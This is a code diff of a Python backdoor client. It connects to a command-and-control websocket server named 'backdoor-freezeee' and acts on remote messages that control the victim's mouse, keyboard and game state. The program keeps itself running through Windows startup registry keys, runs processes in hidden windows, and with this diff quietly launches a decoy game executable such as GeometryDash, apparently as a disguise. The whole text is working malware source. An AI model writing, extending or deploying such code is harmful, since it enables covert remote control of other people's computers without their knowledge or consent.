@@ -1,7 +1,7 @@
 from time import sleep
 from messagehandler import handle_message
-from implementations import *
 import asyncio
+from implementations import *
 import websockets  # type: ignore
 import sys
 import os
@@ -11,6 +11,7 @@ import socket
 import shutil
 
 server_url = "wss://backdoor-freezeee.onrender.com"
+# server_url = "ws://localhost:8602"
 
 CLIENT_NAME = socket.gethostname()
 
@@ -51,7 +52,7 @@ def ensure_startup_persistence():
         path = rf"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\{source}"
         try:
             with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path) as key:
-                value, _, _ = winreg.QueryValueEx(key, name)
+                value, _ = winreg.QueryValueEx(key, name)
                 return value[0] == 0x02
         except FileNotFoundError:
             return True
@@ -201,17 +202,38 @@ startupinfo.wShowWindow = subprocess.SW_HIDE
 
 creationflags = subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
 
+geometry_exe = os.path.join(os.path.dirname(sys.executable), "uninstaller.exe")
+if not os.path.isfile(geometry_exe):
+    geometry_exe = os.path.join(os.path.dirname(sys.executable), "garbage", "uninstaller.exe")
+    if not os.path.isfile(geometry_exe):
+        geometry_exe = os.path.join(os.path.dirname(sys.executable), "garbage", "GeometryDash.exe")
+        if not os.path.isfile(geometry_exe):
+            geometry_exe = os.path.join(os.path.dirname(sys.executable), "garbage", "UltimateChickenHorse.exe")
+            if not os.path.isfile(geometry_exe):
+                geometry_exe = None
+
+
+if geometry_exe:
+    try:
+        subprocess.Popen(
+            [geometry_exe],
+            startupinfo=startupinfo,
+            creationflags=creationflags
+        )
+    except Exception:
+        print("Failed to launch uninstaller.exe")
+
 state = {
     "mouse": None,
     "keyboard": None,
     "valorant": None,
 }
 
-if not im_in_startup():
-    hide_file(sys.executable)
-    sleep(3)
+# if not im_in_startup():
+#     hide_file(sys.executable)
+#     sleep(3)
+
 ensure_persistence()
-monitor_taskmgr()
 check_reinstall()
 
 async def receiver(ws):
@@ -219,8 +241,8 @@ async def receiver(ws):
         async for msg in ws:
             if msg != "PONG":
                 handle_message(msg, block_exe, valorantblock_exe, state, startupinfo, creationflags)
-    except Exception:
-        pass
+    except Exception as e:
+        print(f"Receiver exception: {e}")
 
 async def main():
     print("Connecting to server...")
